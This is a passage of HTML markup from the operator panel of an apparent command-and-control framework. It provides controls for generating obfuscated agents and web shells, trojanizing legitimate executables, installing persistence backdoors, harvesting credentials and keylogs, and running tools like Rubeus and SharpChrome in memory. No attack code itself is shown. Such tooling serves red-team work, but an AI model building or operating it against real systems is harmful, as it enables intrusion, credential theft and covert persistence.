                <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Listener (Callback)</label>
                <select id="pl-listener-select" onchange="onListenerSelect()" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;margin-bottom:6px;">
                  <option value="">-- Select a listener or preset --</option>
                </select>
                <input type="text" id="pl-url" placeholder="https://your-c2:443" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;">
                <div style="font-size:10px;color:var(--text-muted);margin-top:3px;">Select from above or type a custom URL</div>
              </div>

              <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:12px;">
                <div>
                  <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Sleep (seconds)</label>
                  <input type="number" id="pl-sleep" value="10" min="1" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
                </div>
                <div>
                  <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Jitter (%)</label>
                  <input type="number" id="pl-jitter" value="20" min="0" max="50" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
                </div>
              </div>

              <!-- App template selector (hidden by default) -->
              <div id="pl-app-row" style="margin-bottom:12px; display:none;">
                <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">App Template</label>
                <select id="pl-app-template" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;">
                  <option value="">Loading templates...</option>
                </select>
              </div>

              <!-- Obfuscation options -->
              <div style="margin-bottom:12px;">
                <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Obfuscation Level</label>
                <div style="display:flex;gap:8px">
                  <label style="display:flex;align-items:center;gap:4px;cursor:pointer;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;color:var(--text-primary);flex:1;justify-content:center">
                    <input type="radio" name="pl-obfuscation" value="none" checked> None
                  </label>
                  <label style="display:flex;align-items:center;gap:4px;cursor:pointer;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;color:var(--text-primary);flex:1;justify-content:center">
                    <input type="radio" name="pl-obfuscation" value="strip"> Strip (ldflags -s -w)
                  </label>
                  <label style="display:flex;align-items:center;gap:4px;cursor:pointer;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;color:var(--text-primary);flex:1;justify-content:center">
                    <input type="radio" name="pl-obfuscation" value="garble"> Garble (full obfuscation)
                  </label>
                </div>
              </div>

              <button onclick="generatePayload()" class="btn" style="width:100%;padding:12px;font-size:14px;" id="pl-btn">
                Generate Payload
              </button>
            </div>

            <!-- Right: Output -->
            <div>
              <div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:16px;min-height:280px;" id="pl-output">
                <div style="color:var(--text-muted);text-align:center;padding:40px 0;">
                  <div style="font-size:40px;margin-bottom:12px;opacity:0.3;">🔧</div>
                  <p>Select a payload type and click Generate</p>
                  <p style="font-size:12px;margin-top:8px;">Output will appear here</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Quick Reference -->
      <div class="card">
        <div class="card-header"><h3><span>📖</span> Quick Reference</h3></div>
        <div class="card-body padded">
          <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;">
            <div>
              <h4 style="color:var(--accent-light);font-size:12px;margin-bottom:6px;">AGENT BINARIES</h4>
              <p style="font-size:12px;color:var(--text-muted);">Cross-compiled Go agents with embedded encryption keys. Run on target, calls back to your listener.</p>
            </div>
            <div>
              <h4 style="color:var(--accent-light);font-size:12px;margin-bottom:6px;">WEB SHELLS</h4>
              <p style="font-size:12px;color:var(--text-muted);">Token-protected shells with 404 decoy. Upload to web server, access with X-Debug-Token header.</p>
            </div>
            <div>
              <h4 style="color:var(--accent-light);font-size:12px;margin-bottom:6px;">MOBILE PAYLOADS</h4>
              <p style="font-size:12px;color:var(--text-muted);">Android APK projects with evasion suite. iOS MDM profiles and phishing pages. 30+ fake app templates.</p>
            </div>
          </div>
        </div>
      </div>

      <!-- Backdoor Generator -->
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">
        <div class="card">
          <div class="card-header"><h3><span>💉</span> Binary Backdoor</h3></div>
          <div class="card-body padded">
            <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Inject Phantom agent into a legitimate executable. The original app runs normally + agent calls back silently.</p>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Input Binary Path</label>
              <input type="text" id="bd-input" placeholder="C:\Program Files\PuTTY\putty.exe" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
            </div>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Listener (Callback)</label>
              <select id="bd-listener" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;margin-bottom:6px">
                <option value="">-- Select listener --</option>
              </select>
              <input type="text" id="bd-url" placeholder="http://172.20.41.154:8080" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
            </div>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Output Path (optional)</label>
              <input type="text" id="bd-output" placeholder="auto-generated" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
            </div>
            <button onclick="backdoorBinary()" class="btn" style="width:100%;padding:12px;font-size:14px">💉 Backdoor Binary</button>
            <div id="bd-result" style="margin-top:10px;font-size:13px"></div>
          </div>
        </div>

        <div class="card">
          <div class="card-header"><h3><span>🔓</span> Persistence Backdoors</h3></div>
          <div class="card-body padded">
            <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Generate persistence scripts for Windows and Linux targets.</p>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Backdoor Type</label>
              <select id="bd-type" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
                <option value="dll-sideload">DLL Sideloading (Teams, Slack, Chrome...)</option>
                <option value="lnk">LNK Shortcut Backdoor</option>
                <option value="installer">Installer Wrapper (Trojanized Setup)</option>
                <option value="service-dll">Windows Service DLL</option>
                <option value="registry">Registry Run Key</option>
                <option value="schtask">Scheduled Task (every 15min)</option>
                <option value="wmi">WMI Event (fileless)</option>
                <option value="office-template">Office Template Macro</option>
                <option value="startup">Startup Folder VBScript</option>
                <option value="bashrc">Linux Bash RC + Cron + Systemd</option>
              </select>
            </div>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Target App (for DLL/LNK)</label>
              <input type="text" id="bd-target-app" placeholder="teams, chrome, slack, notepad..." style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
            </div>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Listener URL</label>
              <input type="text" id="bd-persist-url" placeholder="http://172.20.41.154:8080" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace">
            </div>
            <button onclick="generatePersistBackdoor()" class="btn" style="width:100%;padding:12px;font-size:14px">🔓 Generate Backdoor</button>
            <div id="bd-persist-result" style="margin-top:10px;font-size:13px"></div>
          </div>
        </div>
      </div>

      <!-- Payload History (like Mythic) -->
      <div class="card" style="margin-top:14px">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>📦</span> Payload History</h3>
          <button class="qbtn" onclick="loadPayloadHistory()" style="font-size:11px">Refresh</button>
        </div>
        <div class="card-body"><table>
          <thead><tr><th>ID</th><th>Type</th><th>Filename</th><th>Size</th><th>Listener</th><th>Created</th><th></th></tr></thead>
          <tbody id="payload-history-table"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ FILES / SCREENSHOTS / PROCESSES ══════ -->
    <div id="p-files" class="page">

      <!-- Agent selector -->
      <div style="display:flex;gap:12px;align-items:center;margin-bottom:16px;">
        <span style="color:var(--text-muted);font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px;">Target Agent</span>
        <div class="select-wrap">
          <select id="fb-agent" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;min-width:220px;">
            <option value="">Select an agent...</option>
          </select>
        </div>
      </div>

      <!-- Three panels side by side -->
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-bottom:16px;">

        <!-- File Browser -->
        <div class="card">
          <div class="card-header"><h3><span>📂</span> File Browser</h3></div>
          <div class="card-body padded">
            <div style="display:flex;gap:8px;margin-bottom:12px;">
              <input type="text" id="fb-path" placeholder="/ or C:\\" style="flex:1;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;">
              <button class="btn" onclick="browseFiles()" style="padding:8px 14px;font-size:12px;">Browse</button>
            </div>
            <div style="display:flex;gap:6px;margin-bottom:10px;">
              <button class="qbtn" onclick="fbGoUp()" title="Go to parent directory">⬆ Up</button>
              <button class="qbtn" onclick="browseFiles()" title="Refresh current directory">🔄 Refresh</button>
            </div>
            <div id="fb-quick-btns" class="quick-actions" style="margin-bottom:10px;">
              <button class="qbtn" onclick="browseDir('/')">/ (root)</button>
              <button class="qbtn" onclick="browseDir('/home')">home</button>
              <button class="qbtn" onclick="browseDir('/etc')">etc</button>
              <button class="qbtn" onclick="browseDir('/tmp')">tmp</button>
            </div>
            <div id="fb-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;max-height:350px;overflow-y:auto;font-family:monospace;font-size:12px;color:var(--text-muted);white-space:pre-wrap;">
              Select an agent and path, then click Browse.
            </div>
          </div>
        </div>

        <!-- Screenshot -->
        <div class="card">
          <div class="card-header"><h3><span>📸</span> Screenshot</h3></div>
          <div class="card-body padded">
            <button class="btn" onclick="requestScreenshot()" style="width:100%;padding:10px;font-size:13px;margin-bottom:12px;">📸 Capture Screenshot</button>
            <div id="ss-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;display:flex;align-items:center;justify-content:center;">
              <div style="text-align:center;color:var(--text-muted);">
                <div style="font-size:40px;opacity:0.3;margin-bottom:8px;">📸</div>
                <p style="font-size:12px;">Click capture to request a screenshot from the agent.</p>
                <p style="font-size:11px;margin-top:4px;">Results appear in the agent's task history.</p>
              </div>
            </div>
          </div>
        </div>

        <!-- Process List -->
        <div class="card">
          <div class="card-header"><h3><span>⚙️</span> Process List</h3></div>
          <div class="card-body padded">
            <button class="btn" onclick="requestProcessList()" style="width:100%;padding:10px;font-size:13px;margin-bottom:12px;">⚙️ List Processes</button>
            <div id="ps-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;max-height:350px;overflow-y:auto;font-family:monospace;font-size:11px;color:var(--text-muted);white-space:pre-wrap;">
              Click to request the running process list from the agent.
            </div>
          </div>
        </div>
      </div>

      <!-- Agent Notes -->
      <div class="card">
        <div class="card-header"><h3><span>📝</span> Agent Notes</h3></div>
        <div class="card-body padded">
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <input type="text" id="note-input" placeholder="Add a note (creds, findings, pivot info...)" style="flex:1;padding:10px 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onkeydown="if(event.key==='Enter')addNote()">
            <button class="btn" onclick="addNote()" style="padding:10px 16px;">Add Note</button>
          </div>
          <div id="notes-list" style="max-height:200px;overflow-y:auto;">
            <div style="color:var(--text-muted);font-size:12px;padding:8px;">Select an agent to view notes.</div>
          </div>
        </div>
      </div>

      <!-- Search Output -->
      <div class="card">
        <div class="card-header"><h3><span>🔍</span> Search Task Output</h3></div>
        <div class="card-body padded">
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <input type="text" id="search-input" placeholder="Search across all agent output (passwords, hashes, configs...)" style="flex:1;padding:10px 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onkeydown="if(event.key==='Enter')searchOutput()">
            <button class="btn" onclick="searchOutput()" style="padding:10px 16px;">Search</button>
          </div>
          <div id="search-results" style="max-height:300px;overflow-y:auto;">
            <div style="color:var(--text-muted);font-size:12px;padding:8px;">Search results will appear here.</div>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ CREDENTIALS ══════ -->
    <div id="p-creds" class="page">
      <div class="card">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>🔑</span> Credential Manager</h3>
          <button class="qbtn" onclick="showAddCred()" style="font-size:11px">+ Add Credential</button>
        </div>
        <div class="card-body">
          <div id="add-cred-form" style="display:none;margin-bottom:16px;padding:14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius)">
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr auto;gap:8px;align-items:end">
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Source</label><input id="cred-source" placeholder="ds-gateway" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px"></div>
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Username</label><input id="cred-user" placeholder="admin" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px"></div>
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Password/Hash</label><input id="cred-pass" placeholder="P@ssword" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace"></div>
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Type</label><select id="cred-type" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px"><option>password</option><option>hash</option><option>token</option><option>key</option><option>cookie</option></select></div>
              <button class="qbtn" onclick="addCred()" style="padding:6px 14px;font-size:12px;background:var(--accent-glow);color:var(--accent-light)">Save</button>
            </div>
          </div>
          <table>
            <thead><tr><th>Source</th><th>Username</th><th>Password/Hash</th><th>Type</th><th>Added</th><th></th></tr></thead>
            <tbody id="cred-table"></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ══════ LOOT ══════ -->
    <div id="p-loot" class="page">
      <div class="card">
        <div class="card-header"><h3><span>🎯</span> Loot Viewer</h3></div>
        <div class="card-body">
          <div style="display:flex;gap:8px;margin-bottom:14px">
            <select id="loot-filter" onchange="loadLoot()" style="padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
              <option value="all">All Types</option>
              <option value="credentials">Credentials</option>
              <option value="file">Files</option>
              <option value="screenshot">Screenshots</option>
              <option value="keylog">Keylogs</option>
              <option value="sysinfo">Sysinfo</option>
              <option value="output">Shell Output</option>
            </select>
            <button class="qbtn" onclick="loadLoot()" style="font-size:12px">Refresh</button>
          </div>
          <div id="loot-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:12px"></div>
        </div>
      </div>
    </div>

    <!-- ══════ PIVOT GRAPH ══════ -->
    <div id="p-pivotgraph" class="page">
      <div class="card">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>🗺️</span> Network Pivot Map</h3>
          <button class="qbtn" onclick="drawPivotGraph()" style="font-size:11px">Refresh</button>
        </div>
        <div class="card-body">
          <canvas id="pivot-canvas" width="900" height="500" style="width:100%;background:var(--bg-input);border-radius:var(--radius);border:1px solid var(--border)"></canvas>
          <div style="margin-top:10px;display:flex;gap:16px;justify-content:center;font-size:11px;color:var(--text-muted)">
            <span><span style="color:var(--green)">●</span> Active Agent</span>
            <span><span style="color:var(--red)">●</span> Dead Agent</span>
            <span><span style="color:var(--yellow)">●</span> Pivot Host</span>
            <span style="color:var(--accent-light)">─── SSH Pivot</span>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ IOC DASHBOARD ══════ -->
    <div id="p-ioc" class="page">
      <div class="card">
        <div class="card-header"><h3><span>🚨</span> Indicators of Compromise (IOC) Dashboard</h3></div>
        <div class="card-body">
          <div style="margin-bottom:14px;color:var(--text-muted);font-size:12px">Tracks artifacts generated during the engagement that defenders could detect.</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px" id="ioc-grid">
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>📂</span> Files Dropped</h3></div>
              <div class="card-body" id="ioc-files" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>🌐</span> Network Connections</h3></div>
              <div class="card-body" id="ioc-network" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>⚙️</span> Processes Created</h3></div>
              <div class="card-body" id="ioc-procs" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>🔧</span> Registry / Persistence</h3></div>
              <div class="card-body" id="ioc-persist" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
          </div>
        </div>
      </div>
      <div class="card" style="margin-top:14px">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>📜</span> Session Replay</h3>
          <select id="replay-agent" onchange="loadReplay()" style="padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
            <option value="">Select agent...</option>
          </select>
        </div>
        <div class="card-body">
          <div id="replay-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:14px;min-height:200px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:11px;white-space:pre-wrap;color:var(--text-muted)">
            Select an agent to replay its session history.
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ TEMPLATES ══════ -->
    <div id="p-templates" class="page">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
        <div class="card">
          <div class="card-header"><h3><span>📑</span> Command Templates</h3></div>
          <div class="card-body" id="template-list"></div>
        </div>
        <div class="card">
          <div class="card-header"><h3><span>🛡️</span> MITRE ATT&CK Mapping</h3></div>
          <div class="card-body">
            <div style="font-size:12px;color:var(--text-muted);margin-bottom:12px">Commands are mapped to MITRE ATT&CK techniques</div>
            <div id="mitre-map" style="display:grid;grid-template-columns:1fr 1fr;gap:6px"></div>
          </div>
        </div>
      </div>
      <div class="card" style="margin-top:14px">
        <div class="card-header"><h3><span>⚡</span> Auto-Tasks (Run on New Agent)</h3></div>
        <div class="card-body">
          <div style="display:flex;gap:8px;margin-bottom:12px">
            <select id="at-cmd" style="padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;width:150px">
              <option value="sysinfo">sysinfo</option>
              <option value="shell">shell</option>
              <option value="ps">ps</option>
              <option value="screenshot">screenshot</option>
            </select>
            <input id="at-args" placeholder="args (optional)" style="flex:1;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
            <button class="qbtn" onclick="addAutoTask()" style="padding:8px 14px;font-size:12px">+ Add</button>
          </div>
          <div id="autotask-list"></div>
        </div>
      </div>
    </div>

    <!-- ══════ AUDIT ══════ -->
    <div id="p-audit" class="page">
      <div class="card">
        <div class="card-header"><h3><span>📝</span> Operator Audit Log</h3></div>
        <div class="card-body"><table>
          <thead><tr><th>Time</th><th>Operator</th><th>Agent</th><th>Action</th><th>Detail</th></tr></thead>
          <tbody id="audit-table"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ SETTINGS ══════ -->
    <div id="p-settings" class="page">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">

        <!-- API Keys -->
        <div class="card">
          <div class="card-header"><h3><span>🔐</span> API Keys</h3></div>
          <div class="card-body padded">
            <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px">Generate API keys for scripting and automation. Use with <code>X-API-Key</code> header or <code>Authorization: Bearer</code>.</p>
            <div style="display:flex;gap:8px;margin-bottom:12px">
              <input id="apikey-name" placeholder="Key name (e.g., automation)" style="flex:1;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
              <button class="qbtn" onclick="createAPIKey()" style="font-size:12px;padding:8px 14px">Generate Key</button>
            </div>
            <div id="apikey-result" style="margin-bottom:12px"></div>
            <div id="apikey-list"></div>
          </div>
        </div>

        <!-- Task Queue -->
        <div class="card">
          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
            <h3><span>⏳</span> Task Queue</h3>
            <button class="qbtn" onclick="loadTaskQueue()" style="font-size:11px">Refresh</button>
          </div>
          <div class="card-body">
            <table>
              <thead><tr><th>Agent</th><th>Type</th><th>Args</th><th>Status</th><th>Created</th></tr></thead>
              <tbody id="taskqueue-table"></tbody>
            </table>
          </div>
        </div>

        <!-- File Upload to Agent -->
        <div class="card">
          <div class="card-header"><h3><span>📤</span> Upload File to Agent</h3></div>
          <div class="card-body padded">
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:4px">Target Agent</label>
              <select id="upload-agent" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                <option value="">Select agent...</option>
              </select>
            </div>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:4px">Remote Path (optional)</label>
              <input id="upload-path" placeholder="Auto: /tmp/filename or C:\Users\Public\filename" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
            </div>
            <div style="margin-bottom:10px;padding:20px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer" onclick="document.getElementById('upload-file').click()" id="upload-dropzone">
              <div style="font-size:24px;margin-bottom:6px">📂</div>
              <div style="font-size:12px;color:var(--text-muted)">Click or drag file here</div>
              <input type="file" id="upload-file" style="display:none" onchange="updateDropzone(this)">
            </div>
            <button class="btn" onclick="uploadToAgent()" style="width:100%;padding:10px;font-size:13px">📤 Upload</button>
            <div id="upload-result" style="margin-top:8px;font-size:12px"></div>
          </div>
        </div>

        <!-- Agent Health -->
        <div class="card">
          <div class="card-header"><h3><span>💓</span> Agent Health</h3></div>
          <div class="card-body">
            <canvas id="health-chart" height="200" style="width:100%"></canvas>
          </div>
        </div>
      </div>

      <!-- .NET Assembly Execution Panel -->
      <div class="card" style="margin-top:14px">
        <div class="card-header"><h3><span>⚡</span> .NET Assembly Execution</h3></div>
        <div class="card-body padded">
          <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Upload and execute .NET assemblies in-memory (Seatbelt, Rubeus, SharpHound, Certify, etc). No file dropped to disk.</p>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">

            <!-- Upload & Execute -->
            <div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
              <h4 style="color:var(--accent-light);font-size:13px;margin-bottom:10px">📤 Upload & Execute</h4>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Target Agent</label>
                <select id="asm-agent" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                  <option value="">Select agent...</option>
                </select>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">.NET Assembly (.exe)</label>
                <input type="file" id="asm-file" style="display:none" accept=".exe,.dll" onchange="asmFileSelected(this)">
                <div style="padding:14px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer" onclick="document.getElementById('asm-file').click()" id="asm-dropzone">
                  <div style="font-size:20px;margin-bottom:4px">⚡</div>
                  <div style="font-size:11px;color:var(--text-muted)">Click to select .NET assembly</div>
                </div>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Arguments</label>
                <input id="asm-args" placeholder="-group=all or kerberoast" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
              </div>
              <button class="btn" onclick="executeAssemblyUpload()" style="width:100%;padding:10px;font-size:13px">⚡ Execute In-Memory</button>
              <div id="asm-upload-result" style="margin-top:8px;font-size:12px"></div>
            </div>

            <!-- Inline Base64 -->
            <div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
              <h4 style="color:var(--accent-light);font-size:13px;margin-bottom:10px">📋 Inline Execute (Base64)</h4>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Target Agent</label>
                <select id="asm-inline-agent" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                  <option value="">Select agent...</option>
                </select>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Base64 Assembly</label>
                <textarea id="asm-b64" placeholder="Paste base64-encoded .NET assembly..." style="width:100%;height:80px;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:11px;font-family:monospace;resize:vertical"></textarea>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Arguments</label>
                <input id="asm-inline-args" placeholder="kerberoast /domain:corp.local" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
              </div>
              <button class="btn" onclick="executeAssemblyInline()" style="width:100%;padding:10px;font-size:13px">⚡ Execute Inline</button>
              <div id="asm-inline-result" style="margin-top:8px;font-size:12px"></div>
            </div>
          </div>

          <!-- Quick Presets -->
          <div style="margin-top:12px;padding:12px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius)">
            <div style="font-size:11px;color:var(--text-muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px">Common Assemblies (upload .exe first, then click)</div>
            <div style="display:flex;flex-wrap:wrap;gap:6px">
              <button class="qbtn" onclick="setAsmArgs('-group=all')" style="font-size:10px;padding:4px 10px">Seatbelt -group=all</button>
              <button class="qbtn" onclick="setAsmArgs('kerberoast')" style="font-size:10px;padding:4px 10px">Rubeus kerberoast</button>
              <button class="qbtn" onclick="setAsmArgs('asreproast')" style="font-size:10px;padding:4px 10px">Rubeus asreproast</button>
              <button class="qbtn" onclick="setAsmArgs('-c All')" style="font-size:10px;padding:4px 10px">SharpHound -c All</button>
              <button class="qbtn" onclick="setAsmArgs('find /vulnerable')" style="font-size:10px;padding:4px 10px">Certify find /vulnerable</button>
              <button class="qbtn" onclick="setAsmArgs('triage')" style="font-size:10px;padding:4px 10px">SharpDPAPI triage</button>
              <button class="qbtn" onclick="setAsmArgs('all')" style="font-size:10px;padding:4px 10px">SharpUp all</button>
              <button class="qbtn" onclick="setAsmArgs('logins')" style="font-size:10px;padding:4px 10px">SharpChrome logins</button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ EVENTS ══════ -->
    <div id="p-events" class="page">
      <div style="display:grid;grid-template-columns:2fr 1fr;gap:14px">
        <div class="card">
          <div class="card-header"><h3><span>📜</span> Event Log</h3></div>
          <div class="card-body">
            <div class="event-log" id="event-log"><div class="event-item" style="color:var(--text-muted)">No events yet...</div></div>
          </div>
        </div>
        <div class="card">
          <div class="card-header"><h3><span>📝</span> Engagement Notes</h3></div>
          <div class="card-body">
